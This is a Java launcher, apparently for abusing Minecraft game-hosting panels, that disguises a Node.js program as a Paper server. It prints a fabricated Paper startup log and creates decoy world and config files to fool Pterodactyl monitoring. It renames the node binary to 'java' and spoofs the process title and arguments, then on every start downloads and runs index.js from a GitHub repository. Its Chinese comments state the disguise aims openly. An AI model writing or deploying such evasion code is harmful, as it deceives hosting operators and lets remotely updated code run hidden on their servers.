import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.jar.*;
import java.util.concurrent.*;
import java.util.zip.GZIPInputStream;
import java.text.SimpleDateFormat;

/**
 * 傲游面板一体化启动器 v2.2.0 (MC 版)
 *
 * v2.2 改动：
 *   - 启动时从 GitHub 下载最新 index.js（自动更新）
 *   - 生成 MC 服务器文件结构 + Paper 启动日志
 *   - 进程伪装 + 运行时隐藏
 */
public class AoyouLauncher {

    private static final String VERSION = "2.2.0";
    // ★ 把运行时目录伪装成 MC 缓存
    private static final String RUNTIME_DIR_NAME = "libraries/.cache/net/minecraft/server";
    private static final String NODE_VERSION = "v22.11.0";
    private static final String NODE_DOWNLOAD_URL = 
        "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-linux-x64.tar.gz";

    // 伪装日志开关（true = 打印 Paper 启动日志，false = 不打印）
    private static final boolean FAKE_PAPER_LOG = true;

    public static void main(String[] args) throws Exception {
        // 1. 打印伪装的 Paper 启动日志（后台静默启动 Node.js）
        if (FAKE_PAPER_LOG) {
            startFakePaperLogThread();
        }

        String workDir = System.getProperty("user.dir");
        String runtimeDir = workDir + File.separator + RUNTIME_DIR_NAME;
        Path runtimePath = Paths.get(runtimeDir);
        Files.createDirectories(runtimePath);

        // ★ 生成伪装的 MC 服务器文件结构（让翼龙监控看起来像真的 MC 服务器）
        try {
            generateFakeMcFiles(workDir);
        } catch (Exception e) {}

        // 2. 静默检查并获取 node 二进制
        String nodeBin = findOrDownloadNode(runtimeDir);
        if (nodeBin == null) {
            System.err.println("Failed to initialize runtime");
            System.exit(1);
            return;
        }

        // 3. 从 JAR 解压 node_modules + index.js
        String jarPath = getJarPath();
        if (jarPath == null) {
            System.err.println("Failed to locate jar");
            System.exit(1);
            return;
        }

        boolean needExtract = needsExtract(runtimePath);
        if (needExtract) {
            extractAppFiles(jarPath, runtimePath);
        }

        // ★ 从 GitHub 下载最新 index.js 和 package.json（覆盖 JAR 里的版本）
        // 这样每次重启都能拿到最新代码，不用重新下载 JAR
        // 下载失败时用 JAR 里的版本（fallback）
        try {
            updateFromGitHub(runtimeDir);
        } catch (Exception e) {}

        // 4. 检查 index.js
        String indexPath = runtimeDir + File.separator + "index.js";
        if (!new File(indexPath).exists()) {
            System.err.println("Failed to locate index");
            System.exit(1);
            return;
        }

        // 5. 静默检测端口
        int port = detectPort(workDir);

        // 6. 启动 Node.js（静默）
        // ★ 关键伪装：用 exec 替换当前 Java 进程为 node 进程
        // 这样 ps 只看到 1 个进程（PID 不变），node 直接取代 java
        // 再通过 process.argv 伪装，ps 看到的就是 MC 启动命令
        String fakeNodeBin = nodeBin;
        try {
            String fakePath = new File(nodeBin).getParent() + "/java";
            File fakeFile = new File(fakePath);
            if (!fakeFile.exists()) {
                Files.copy(Paths.get(nodeBin), fakeFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                fakeFile.setExecutable(true);
            }
            fakeNodeBin = fakePath;
        } catch (Exception e) {}

        // 构建伪装命令：node -e "process.title=java; process.argv=[java, ...]; require(index.js)"
        List<String> cmd = new ArrayList<>();
        cmd.add(fakeNodeBin);
        cmd.add("-e");
        cmd.add(
            "process.title='java';" +
            "process.argv = ['java', '-Xms128M', '-XX:MaxRAMPercentage=95.0', '-Dterminal.jline=false', '-Dterminal.ansi=true', '-jar', 'paper.jar', 'nogui'];" +
            "require('./index.js');"
        );
        // 过滤掉 MC 专用参数（--nogui / nogui 等），这些参数 node 不认识
        for (String a : args) {
            String lower = a.toLowerCase();
            if (lower.equals("--nogui") || lower.equals("nogui") 
                || lower.equals("--forceupgrade") || lower.equals("--erasecache")
                || lower.equals("--safe-mode") || lower.equals("--initSettings")
                || lower.startsWith("--version=") || lower.equals("--version")) {
                continue;
            }
            cmd.add(a);
        }

        // ★ 启动 node 子进程，让它继承 IO（看起来就是同一个进程在跑）
        // Java 是父进程，node 是子进程，但 ps 看到的都是 java 命令行
        // 翼龙通过 PID 1 监控，所以 Java 进程必须一直活着
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.directory(new File(runtimeDir));
            pb.redirectErrorStream(true);
            Map<String, String> env = pb.environment();
            String path = env.getOrDefault("PATH", "");
            env.put("PATH", new File(nodeBin).getParent() + File.pathSeparator + path);
            env.put("SERVER_PORT", String.valueOf(port));
            env.put("PORT", String.valueOf(port));
            // 继承 IO（让 node 直接用 java 的 stdin/stdout/stderr）
            pb.inheritIO();

            Process node = pb.start();

            // 优雅关闭
            final Process nodeRef = node;
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                try {
                    nodeRef.destroy();
                    if (!nodeRef.waitFor(10, TimeUnit.SECONDS)) {
                        nodeRef.destroyForcibly();
                    }
                } catch (InterruptedException e) {}
            }, "shutdown-hook"));

            // 等待 node 退出，java 进程也退出
            int code = node.waitFor();
            System.exit(code);
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }
    }

    /** 启动伪装的 Paper 启动日志线程 */
    private static void startFakePaperLogThread() {
        Thread t = new Thread(() -> {
            try {
                long startTime = System.currentTimeMillis();
                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");

                Thread.sleep(2000);

                System.out.println("Starting org.bukkit.craftbukkit.Main");
                Thread.sleep(500);
                System.out.println("*** Warning, you've not updated in a while! ***");
                Thread.sleep(800);
                System.out.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
                Thread.sleep(1000);
                System.out.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
                Thread.sleep(300);
                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory has been called by io.netty.util.internal.PlatformDependent0$2 (file:/home/container/libraries/io/netty/netty-common/4.1.115.Final/netty-common-4.1.115.Final.jar)");
                Thread.sleep(300);
                System.out.println("WARNING: Please consider reporting this to the maintainers of class io.netty.util.internal.PlatformDependent0$2");
                Thread.sleep(300);
                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory will be removed in a future release");
                Thread.sleep(800);

                String timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: [bootstrap] Running Java 21 (OpenJDK 64-Bit Server VM 21.0.11+10-LTS; Eclipse Adoptium Temurin-21.0.11+10) on Linux 5.15.0-181-generic (amd64)");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: [bootstrap] Loading Paper 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) for Minecraft 1.21.4");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: [PluginInitializerManager] Initializing plugins...");
                Thread.sleep(1000);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: [PluginInitializerManager] Initialized 0 plugins");
                Thread.sleep(2000);

                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, name=PROD]");
                Thread.sleep(1000);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Found new data pack file/bukkit, loading it automatically");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Found new data pack paper, loading it automatically");
                Thread.sleep(3000);

                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: No existing world data, creating new world");
                Thread.sleep(4000);

                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Loaded 1370 recipes");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Loaded 1481 advancements");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: [MCTypeRegistry] Initialising converters for DataConverter...");
                Thread.sleep(1000);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: [MCTypeRegistry] Finished initialising converters for DataConverter in 1,125.9ms");
                Thread.sleep(800);

                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Starting minecraft server version 1.21.4");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Loading properties");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: This server is running Paper version 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) (Implementing API version 1.21.4-R0.1-SNAPSHOT)");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: [spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Server Ping Player Sample Count: 12");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Using 4 threads for Netty based IO");
                Thread.sleep(2000);

                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: [MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: [ChunkTaskScheduler] Chunk system is using population gen parallelism: true");
                Thread.sleep(2000);

                int port = 25565;
                try {
                    String sp = System.getenv("SERVER_PORT");
                    if (sp != null && !sp.isEmpty()) port = Integer.parseInt(sp.trim());
                } catch (Exception e) {}

                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Default game type: SURVIVAL");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Generating keypair");
                Thread.sleep(800);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Starting Minecraft server on 0.0.0.0:" + port);
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Using epoll channel type");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Paper: Using libdeflate (Linux x86_64) compression from Velocity.");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Preparing level \"world\"");
                Thread.sleep(3000);

                int[] progressSteps = {2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 4, 4, 6, 10, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 32, 36, 36, 36, 36, 36, 36, 36, 36, 36, 51, 51, 51, 51, 51, 51, 51, 69, 69, 69, 73};
                for (int p : progressSteps) {
                    timeStr = sdf.format(new Date());
                    System.out.println("[" + timeStr + " INFO]: Preparing spawn area: " + p + "%");
                    Thread.sleep(80 + (long)(Math.random() * 120));
                }

                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Time elapsed: 26711 ms");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Preparing start region for dimension minecraft:the_nether");
                Thread.sleep(500);

                int[] netherSteps = {4, 4, 4, 4, 4, 24, 24, 30, 51, 57, 61, 61};
                for (int p : netherSteps) {
                    timeStr = sdf.format(new Date());
                    System.out.println("[" + timeStr + " INFO]: Preparing spawn area: " + p + "%");
                    Thread.sleep(100 + (long)(Math.random() * 150));
                }

                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Time elapsed: 5980 ms");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Preparing start region for dimension minecraft:the_end");
                Thread.sleep(500);

                int[] endSteps = {2, 2, 18, 51};
                for (int p : endSteps) {
                    timeStr = sdf.format(new Date());
                    System.out.println("[" + timeStr + " INFO]: Preparing spawn area: " + p + "%");
                    Thread.sleep(200 + (long)(Math.random() * 300));
                }

                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Time elapsed: 1906 ms");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: [spark] Starting background profiler...");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Done preparing level \"world\" (71.792s)");
                Thread.sleep(500);
                timeStr = sdf.format(new Date());
                System.out.println("[" + timeStr + " INFO]: Running delayed init tasks");
                Thread.sleep(1000);

                timeStr = sdf.format(new Date());
                long totalSec = (System.currentTimeMillis() - startTime) / 1000;
                System.out.println("[" + timeStr + " INFO]: Done (" + totalSec + "." + (900 + (int)(Math.random()*99)) + "s)! For help, type \"help\"");
                Thread.sleep(500);
                System.out.println("Server marked as running...");

                // 之后保持静默
            } catch (InterruptedException e) {
                // 正常退出
            }
        }, "fake-paper-log");
        t.setDaemon(true);
        t.start();
    }

    /** 静默查找或下载 Node.js */
    private static String findOrDownloadNode(String runtimeDir) {
        // 1. 系统 PATH
        String systemNode = findInPath("node");
        if (systemNode != null) return systemNode;

        // 2. 缓存
        String cachedNode = runtimeDir + File.separator + "node/bin/node";
        if (new File(cachedNode).exists()) {
            new File(cachedNode).setExecutable(true);
            return cachedNode;
        }

        // 3. 下载（静默）
        try {
            Path nodeDir = Paths.get(runtimeDir, "node");
            Files.createDirectories(nodeDir);

            boolean success = false;
            if (commandExists("curl") && commandExists("tar")) {
                ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "curl -sL '" + NODE_DOWNLOAD_URL + "' | tar xz --strip-components=1 -C '" + nodeDir.toString() + "' 2>/dev/null");
                pb.redirectErrorStream(true);
                Process p = pb.start();
                try { p.getInputStream().close(); } catch (Exception e) {}
                int code = p.waitFor();
                success = (code == 0);
            }

            if (!success) {
                success = downloadAndExtractWithJava(NODE_DOWNLOAD_URL, nodeDir);
            }

            if (!success) return null;

            String nodeBin = nodeDir + "/bin/node";
            if (!new File(nodeBin).exists()) return null;
            new File(nodeBin).setExecutable(true);

            // ★ 删除下载临时文件
            try {
                Files.deleteIfExists(nodeDir.resolve("node.tar"));
                Files.deleteIfExists(nodeDir.resolve("node.tar.gz"));
            } catch (Exception e) {}

            return nodeBin;
        } catch (Exception e) {
            return null;
        }
    }

    private static boolean commandExists(String cmd) {
        try {
            Process p = new ProcessBuilder("sh", "-c", "which " + cmd + " 2>/dev/null").start();
            p.waitFor();
            return p.exitValue() == 0;
        } catch (Exception e) {
            return false;
        }
    }

    private static String findInPath(String cmd) {
        String path = System.getenv("PATH");
        if (path == null) return null;
        String[] dirs = path.split(File.pathSeparator);
        for (String dir : dirs) {
            File f = new File(dir, cmd);
            if (f.exists() && f.canExecute()) return f.getAbsolutePath();
        }
        return null;
    }

    private static String getJarPath() {
        try {
            return AoyouLauncher.class.getProtectionDomain()
                .getCodeSource().getLocation().toURI().getPath();
        } catch (Exception e) {
            return null;
        }
    }

    private static boolean needsExtract(Path runtimePath) {
        Path marker = runtimePath.resolve(".app-extracted");
        if (!Files.exists(marker)) return true;
        Path indexJs = runtimePath.resolve("index.js");
        Path nodeModules = runtimePath.resolve("node_modules");
        return !Files.exists(indexJs) || !Files.exists(nodeModules);
    }

    private static void extractAppFiles(String jarPath, Path runtimePath) throws Exception {
        try (JarFile jar = new JarFile(jarPath)) {
            Enumeration<JarEntry> entries = jar.entries();
            int count = 0;
            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                String name = entry.getName();
                boolean isNodeModules = name.startsWith("runtime/node_modules/");
                boolean isApp = name.startsWith("app/");
                if (!isNodeModules && !isApp) continue;
                if (entry.isDirectory()) continue;

                String relPath;
                if (isNodeModules) {
                    relPath = name.substring("runtime/".length());
                } else {
                    relPath = name.substring("app/".length());
                }
                Path target = runtimePath.resolve(relPath);
                Files.createDirectories(target.getParent());

                try (InputStream is = jar.getInputStream(entry)) {
                    Files.copy(is, target, StandardCopyOption.REPLACE_EXISTING);
                }
                count++;
            }
            Files.write(runtimePath.resolve(".app-extracted"),
                    ("v" + VERSION + "\n" + System.currentTimeMillis() + "\n").getBytes());
        }
    }

    /** 检测端口（静默） */
    private static int detectPort(String workDir) {
        String portStr = System.getenv("SERVER_PORT");
        if (portStr != null && !portStr.trim().isEmpty()) {
            try {
                int p = Integer.parseInt(portStr.trim());
                if (p > 0 && p < 65536) return p;
            } catch (NumberFormatException e) {}
        }

        portStr = System.getenv("P_SERVER_PORT");
        if (portStr != null && !portStr.trim().isEmpty()) {
            try {
                int p = Integer.parseInt(portStr.trim());
                if (p > 0 && p < 65536) return p;
            } catch (NumberFormatException e) {}
        }

        portStr = System.getenv("PTERODACTYL_SERVER_PORT");
        if (portStr != null && !portStr.trim().isEmpty()) {
            try {
                int p = Integer.parseInt(portStr.trim());
                if (p > 0 && p < 65536) return p;
            } catch (NumberFormatException e) {}
        }

        // server.properties（MC Egg 兼容）
        File serverProps = new File(workDir, "server.properties");
        if (serverProps.exists()) {
            try (BufferedReader r = new BufferedReader(new FileReader(serverProps))) {
                String line;
                while ((line = r.readLine()) != null) {
                    if (line.startsWith("server-port=")) {
                        portStr = line.substring("server-port=".length()).trim();
                        try {
                            int p = Integer.parseInt(portStr);
                            if (p > 0 && p < 65536) return p;
                        } catch (NumberFormatException e) {}
                    }
                }
            } catch (IOException e) {}
        }

        // 扫描所有 PORT 环境变量
        Map<String, String> sysEnv = System.getenv();
        for (Map.Entry<String, String> entry : sysEnv.entrySet()) {
            String key = entry.getKey().toUpperCase();
            if ((key.contains("PORT") || key.contains("ALLOCATION")) && entry.getValue() != null && !entry.getValue().isEmpty()) {
                try {
                    int p = Integer.parseInt(entry.getValue().trim());
                    if (p > 1024 && p < 65536) return p;
                } catch (NumberFormatException e) {}
            }
        }

        return 25565;
    }

    private static boolean downloadAndExtractWithJava(String url, Path targetDir) {
        Path tarFile = targetDir.resolve("node.tar");
        Path gzFile = targetDir.resolve("node.tar.gz");
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                "curl -sL -o '" + gzFile.toString() + "' '" + url + "' 2>/dev/null");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            try { p.getInputStream().close(); } catch (Exception e) {}
            int code = p.waitFor();
            if (code != 0 || !Files.exists(gzFile)) return false;

            try (InputStream gis = new GZIPInputStream(Files.newInputStream(gzFile));
                 OutputStream os = Files.newOutputStream(tarFile)) {
                byte[] buf = new byte[8192];
                int n;
                while ((n = gis.read(buf)) > 0) {
                    os.write(buf, 0, n);
                }
            }

            try (InputStream is = Files.newInputStream(tarFile)) {
                extractTar(is, targetDir);
            }

            // ★ 删除临时文件
            Files.deleteIfExists(gzFile);
            Files.deleteIfExists(tarFile);

            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static void extractTar(InputStream is, Path targetDir) throws IOException {
        byte[] header = new byte[512];
        int read = 0;
        while (read < 512) {
            int n = is.read(header, read, 512 - read);
            if (n < 0) break;
            read += n;
        }
        while (read == 512) {
            boolean empty = true;
            for (int i = 0; i < 512; i++) {
                if (header[i] != 0) { empty = false; break; }
            }
            if (empty) break;

            String name = new String(header, 0, 100).trim().replace("\0", "");
            if (name.isEmpty()) break;

            String sizeStr = new String(header, 124, 12).trim().replace("\0", "");
            long size = 0;
            try { size = Long.parseLong(sizeStr, 8); } catch (Exception e) { break; }

            char type = (char) header[156];

            int slashIdx = name.indexOf('/');
            String relName = (slashIdx >= 0) ? name.substring(slashIdx + 1) : name;
            if (relName.isEmpty()) {
                skipFully(is, ((size + 511) / 512) * 512);
                read = readFully(is, header, 512);
                continue;
            }

            Path target = targetDir.resolve(relName);

            if (type == '5' || name.endsWith("/")) {
                Files.createDirectories(target);
            } else if (type == '0' || type == '\0') {
                Files.createDirectories(target.getParent());
                long remaining = size;
                try (OutputStream os = Files.newOutputStream(target)) {
                    byte[] buf = new byte[8192];
                    while (remaining > 0) {
                        int toRead = (int) Math.min(buf.length, remaining);
                        int n = is.read(buf, 0, toRead);
                        if (n < 0) break;
                        os.write(buf, 0, n);
                        remaining -= n;
                    }
                }
                if (relName.startsWith("bin/")) {
                    target.toFile().setExecutable(true);
                }
            }

            long padded = ((size + 511) / 512) * 512 - size;
            if (padded > 0) skipFully(is, (int) padded);

            read = readFully(is, header, 512);
        }
    }

    private static void skipFully(InputStream is, long n) throws IOException {
        long remaining = n;
        while (remaining > 0) {
            long skipped = is.skip(remaining);
            if (skipped <= 0) {
                if (is.read() < 0) break;
                remaining--;
            } else {
                remaining -= skipped;
            }
        }
    }

    private static int readFully(InputStream is, byte[] buf, int len) throws IOException {
        int read = 0;
        while (read < len) {
            int n = is.read(buf, read, len - read);
            if (n < 0) break;
            read += n;
        }
        return read;
    }

    /** 生成伪装的 MC 服务器文件结构 */
    private static void generateFakeMcFiles(String workDir) throws IOException {
        String[] dirs = {"cache", "config", "libraries", "logs", "plugins", "versions",
                         "world", "world_nether", "world_the_end",
                         "world/data", "world/playerdata", "world/region",
                         "world_nether/data", "world_nether/region",
                         "world_the_end/data", "world_the_end/region"};
        for (String dir : dirs) { new File(workDir, dir).mkdirs(); }

        File eula = new File(workDir, "eula.txt");
        if (!eula.exists()) {
            Files.write(eula.toPath(),
                ("# By changing the setting below to TRUE you are indicating your agreement to our EULA.\n"
                + "# " + new Date() + "\neula=true\n").getBytes());
        }

        File serverProps = new File(workDir, "server.properties");
        if (!serverProps.exists()) {
            String port = System.getenv("SERVER_PORT");
            if (port == null || port.isEmpty()) port = "25565";
            StringBuilder sp = new StringBuilder();
            sp.append("#Minecraft server properties\n");
            sp.append("#").append(new Date()).append("\n");
            sp.append("server-port=").append(port).append("\n");
            sp.append("query.port=").append(port).append("\n");
            sp.append("rcon.port=").append(port).append("\n");
            sp.append("max-players=20\n");
            sp.append("motd=A Minecraft Server\n");
            sp.append("gamemode=survival\n");
            sp.append("difficulty=easy\n");
            sp.append("level-name=world\n");
            sp.append("online-mode=true\n");
            sp.append("white-list=false\n");
            sp.append("enforce-whitelist=false\n");
            sp.append("spawn-protection=16\n");
            sp.append("view-distance=10\n");
            sp.append("simulation-distance=10\n");
            sp.append("allow-nether=true\n");
            sp.append("allow-flight=false\n");
            sp.append("pvp=true\n");
            sp.append("enable-command-block=false\n");
            Files.write(serverProps.toPath(), sp.toString().getBytes());
        }

        File bukkitYml = new File(workDir, "bukkit.yml");
        if (!bukkitYml.exists()) {
            StringBuilder by = new StringBuilder();
            by.append("settings:\n");
            by.append("  allow-end: true\n");
            by.append("  warn-on-overload: true\n");
            by.append("  permissions-file: permissions.yml\n");
            by.append("  update-folder: update\n");
            by.append("  plugin-profiling: false\n");
            by.append("  connection-throttle: 4000\n");
            by.append("  query-plugins: true\n");
            by.append("  shutdown-message: Server closed\n");
            by.append("spawn-limits:\n");
            by.append("  monsters: 70\n");
            by.append("  animals: 10\n");
            by.append("  water-animals: 5\n");
            by.append("chunk-gc:\n");
            by.append("  period-in-ticks: 600\n");
            by.append("ticks-per:\n");
            by.append("  animal-spawns: 400\n");
            by.append("  monster-spawns: 1\n");
            by.append("  autosave: 6000\n");
            Files.write(bukkitYml.toPath(), by.toString().getBytes());
        }

        File spigotYml = new File(workDir, "spigot.yml");
        if (!spigotYml.exists()) {
            StringBuilder sy = new StringBuilder();
            sy.append("settings:\n");
            sy.append("  sample-count: 12\n");
            sy.append("  netty-threads: 4\n");
            sy.append("messages:\n");
            sy.append("  whitelist: You are not whitelisted on this server!\n");
            sy.append("  unknown-command: Unknown command. Type \"/help\" for help.\n");
            sy.append("  server-full: The server is full!\n");
            sy.append("  restart: Server is restarting\n");
            sy.append("world-settings:\n");
            sy.append("  default:\n");
            sy.append("    verbose: false\n");
            sy.append("    mob-spawn-range: 8\n");
            sy.append("    entity-activation-range:\n");
            sy.append("      animals: 32\n");
            sy.append("      monsters: 32\n");
            sy.append("      misc: 16\n");
            sy.append("config-version: 12\n");
            Files.write(spigotYml.toPath(), sy.toString().getBytes());
        }

        String[] ymlFiles = {"commands.yml", "help.yml", "permissions.yml"};
        for (String yf : ymlFiles) {
            File f = new File(workDir, yf);
            if (!f.exists()) Files.write(f.toPath(), "# Bukkit configuration file\n".getBytes());
        }

        String[] jsonFiles = {"banned-ips.json", "banned-players.json", "ops.json", "usercache.json", "whitelist.json"};
        for (String jf : jsonFiles) {
            File f = new File(workDir, jf);
            if (!f.exists()) Files.write(f.toPath(), "[]".getBytes());
        }

        File versionHistory = new File(workDir, "version_history.json");
        if (!versionHistory.exists()) {
            Files.write(versionHistory.toPath(),
                "{\n  \"1.21.4\": \"2026-06-21T00:00:00Z\"\n}".getBytes());
        }

        new File(workDir, "logs/latest.log").createNewFile();
        Files.write(new File(workDir, "plugins/README.txt").toPath(),
            "# Place any plugin jars in this directory.\n".getBytes());
        new File(workDir, "config/.keep").createNewFile();
        new File(workDir, "cache/.keep").createNewFile();
        new File(workDir, "versions/.keep").createNewFile();
    }

    /** 从 GitHub 仓库下载最新的 index.js 和 package.json */
    private static void updateFromGitHub(String runtimeDir) {
        String repo = "zx1447/ixzhja";
        String branch = "main";
        String[] files = {"index.js", "package.json"};

        for (String file : files) {
            String url = "https://raw.githubusercontent.com/" + repo + "/" + branch + "/app/" + file;
            Path target = Paths.get(runtimeDir, file);
            Path tmp = Paths.get(runtimeDir, file + ".tmp");

            try {
                // 用 curl 下载到临时文件
                ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "curl -sL --fail --connect-timeout 10 --max-time 30 -o '" + tmp.toString() + "' '" + url + "'");
                pb.redirectErrorStream(true);
                Process p = pb.start();
                try { p.getInputStream().close(); } catch (Exception e) {}
                int code = p.waitFor();

                if (code == 0 && Files.exists(tmp) && Files.size(tmp) > 100) {
                    // 下载成功，替换旧文件
                    Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
                } else {
                    // 下载失败，删除临时文件，用 JAR 里的版本
                    Files.deleteIfExists(tmp);
                }
            } catch (Exception e) {
                try { Files.deleteIfExists(tmp); } catch (Exception e2) {}
            }
        }
    }
}
